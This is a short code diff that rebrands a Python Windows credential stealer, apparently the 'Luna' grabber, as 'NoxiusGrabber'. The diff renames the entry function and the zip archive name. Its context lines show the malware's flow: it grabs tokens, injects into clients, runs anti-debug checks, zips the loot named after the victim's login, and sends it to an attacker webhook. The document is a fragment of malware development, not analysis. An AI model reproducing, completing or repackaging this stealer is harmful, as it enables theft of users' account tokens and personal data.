@@ -49,7 +49,7 @@ def main(webhook: str):
     zipup()
 
     _file = None
-    _file = File(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
+    _file = File(f'{localappdata}\\NoxiusGrabber-{os.getlogin()}.zip')
 
     content = ""
     if __PING__:
@@ -64,7 +64,7 @@ def main(webhook: str):
     grabtokens()
 
 
-def Luna(webhook: str):
+def noxius(webhook: str):
     debug()
 
     procs = [main, inject]
@@ -72,7 +72,7 @@ def Luna(webhook: str):
     for proc in procs:
         proc(webhook)
 
-    os.remove(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
+    os.remove(f'{localappdata}\\NoxiusGrabber-{os.getlogin()}.zip')
 
 
 def try_extract(func):
@@ -788,4 +788,4 @@ class debug:
 
 
 if __name__ == '__main__' and os.name == "nt":
-    Luna(__WEBHOOK__)
+    noxius(__WEBHOOK__)
